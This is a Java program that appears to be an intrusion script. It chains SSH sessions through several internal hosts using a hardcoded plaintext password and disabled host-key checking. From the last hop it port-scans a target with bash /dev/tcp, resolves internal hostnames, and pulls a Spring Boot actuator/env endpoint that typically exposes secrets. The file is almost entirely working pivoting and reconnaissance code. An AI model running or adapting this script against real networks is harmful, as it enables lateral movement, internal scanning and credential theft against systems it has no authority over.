import com.jcraft.jsch.*;
import java.io.*;
class XSY {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s1 = j.getSession("user", "10.14.36.23", 22);
    s1.setPassword("kutul0nc4t");
    s1.setConfig(p);
    s1.setTimeout(10000);
    s1.connect();
    int fwd1 = s1.setPortForwardingL(0, "10.13.16.117", 22);
    Session s2 = j.getSession("user", "127.0.0.1", fwd1);
    s2.setPassword("kutul0nc4t");
    s2.setConfig(p);
    s2.setTimeout(8000);
    s2.connect();
    ChannelExec ch = (ChannelExec) s2.openChannel("exec");
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.132 'echo ---NUCLEUS-DIRECT---;for p in 8216 8080 8443 80 443; do timeout 1 bash -c \"echo > /dev/tcp/10.13.16.135/$p\" 2>/dev/null && echo 10.13.16.135:$p-OPEN; done;echo ---RESOLVE---;host hammer.prd4.jkt.cpssoft 2>/dev/null | grep address;host iris.prd4.jkt.cpssoft 2>/dev/null | grep address;host service.accurate.id 2>/dev/null | grep address;echo ---NUCLEUS-HTTP---;curl -sk --max-time 3 --resolve account.accurate.id:443:10.13.16.135 https://account.accurate.id/actuator/env 2>/dev/null | head -50' 2>&1 | head -30");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[16384];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s2.disconnect();
    s1.disconnect();
  }
}
